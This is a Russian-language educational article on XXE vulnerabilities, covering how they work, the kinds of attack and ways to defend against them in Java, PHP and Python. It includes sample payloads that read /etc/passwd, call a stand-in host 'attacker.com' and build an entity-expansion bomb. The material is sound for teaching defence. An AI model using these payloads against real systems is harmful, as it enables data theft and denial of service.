**XML External Entity (XXE)** — это уязвимость, связанная с обработкой XML-документов, которая позволяет злоумышленникам выполнять различные атаки на веб-приложения. Уязвимость возникает, когда парсер XML обрабатывает внешние сущности (External Entities) — специальные теги, которые могут ссылаться на внешние ресурсы. XXE-атаки могут привести к чтению конфиденциальных данных с сервера, выполнению удалённых запросов, отказу в обслуживании (DoS) или выполнению произвольного кода.

### Как работает XXE

XML-документ может содержать **внешние сущности** — специальные элементы, которые ссылаются на ресурсы вне самого XML-документа. Эти сущности обычно включаются в документы через DTD (Document Type Definition). Злоумышленник может использовать уязвимость в парсере XML, если сервер неправильно настроен и позволяет обработку таких сущностей.

#### Пример уязвимого XML-документа с внешней сущностью:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<userInfo>
  <name>&xxe;</name>
</userInfo>
```

В данном примере сущность `xxe` ссылается на файл `/etc/passwd` (системный файл в Unix-системах), и если XML-парсер не защищён, он попытается включить содержимое этого файла в обработанный XML-документ, что приведёт к утечке данных.

### Виды XXE-атак

1. **Чтение локальных файлов**:
   XXE может быть использована для чтения содержимого файлов на сервере, которые доступны серверу, но не должны быть доступны пользователю.

   Пример:
   ```xml
   <!ENTITY xxe SYSTEM "file:///etc/hosts">
   ```

2. **Запросы к удалённым ресурсам**:
   Злоумышленник может использовать XXE для отправки запросов на внешние серверы, которые могут позволить ему получить информацию о внутренней сети или даже провести атаку через SSRF (Server-Side Request Forgery).

   Пример:
   ```xml
   <!ENTITY xxe SYSTEM "http://attacker.com/secret-data">
   ```

3. **Отказ в обслуживании (DoS)**:
   Злоумышленники могут использовать уязвимости XXE для создания "бомбы сущностей" (Entity Expansion Bomb), что приведёт к исчерпанию ресурсов сервера и отказу в обслуживании.

   Пример:
   ```xml
   <!DOCTYPE bomb [
     <!ENTITY a "a" >
     <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
     <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
   ]>
   <data>&c;</data>
   ```

4. **Удалённое выполнение кода**:
   В редких случаях, если у сервера есть уязвимые интерпретаторы (например, старые версии PHP с модулем `libxml2`), XXE может позволить злоумышленнику выполнить произвольный код на сервере.

5. **Обход аутентификации**:
   В некоторых случаях XXE может быть использована для обхода механизмов аутентификации или авторизации, если злоумышленник может изменять XML-документ или его структуру.

### Опасности XXE-атак

- **Утечка конфиденциальной информации**: XXE позволяет злоумышленникам читать файлы с сервера, такие как конфигурационные файлы, базы данных, аутентификационные токены, что может привести к краже данных.
  
- **Внутренний скан сети**: Злоумышленник может использовать парсер для выполнения запросов к внутренним сервисам, которые доступны только с сервера, что позволяет ему узнать конфигурацию сети или атаковать другие внутренние ресурсы.
  
- **Разрушение системы**: Атаки DoS на основе XXE могут перегружать систему и делать её недоступной для пользователей.

### Способы защиты от XXE-атак

1. **Отключение обработки внешних сущностей**:
   Один из самых простых способов защиты от XXE — это отключение поддержки внешних сущностей в XML-парсерах. Для большинства языков программирования это делается путём установки соответствующих настроек.

   Пример для Java (с использованием библиотеки `SAXParser`):
   ```java
   SAXParserFactory factory = SAXParserFactory.newInstance();
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

   Пример для PHP (с использованием библиотеки `libxml_disable_entity_loader`):
   ```php
   libxml_disable_entity_loader(true);
   ```

2. **Использование безопасных парсеров**:
   Используйте XML-парсеры, которые по умолчанию отключают обработку внешних сущностей. Многие современные библиотеки парсинга XML уже исправили эти уязвимости и безопасны по умолчанию.

3. **Валидация входных данных**:
   Важно проверять все входные данные, особенно XML-файлы, которые передаются пользователями. Не следует доверять содержимому XML-документа, если он может быть изменён внешним пользователем.

4. **Использование альтернативных форматов данных**:
   Если XML не является критически важным для вашего приложения, рассмотрите возможность использования более простых форматов данных, таких как JSON, который менее подвержен подобным атакам.

5. **Ограничение прав доступа на сервере**:
   Убедитесь, что процессы на сервере имеют минимальные привилегии и что сервер ограничен в доступе к критическим файлам и сервисам.

6. **Мониторинг и аудит**:
   Внедрение систем мониторинга и логирования запросов к XML-парсерам поможет выявить подозрительную активность и предотвратить атаки до их успешного завершения.

### Пример защиты от XXE в Python

В Python для отключения внешних сущностей в библиотеке `lxml` можно использовать следующую настройку:

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False)
tree = etree.parse('input.xml', parser)
```

### Заключение

XXE — это серьёзная уязвимость, которая может привести к утечке данных, компрометации системы или нарушению её работы. Чтобы предотвратить атаки, важно отключать внешние сущности в XML-парсерах, использовать безопасные методы обработки XML и регулярно обновлять библиотеки и инструменты.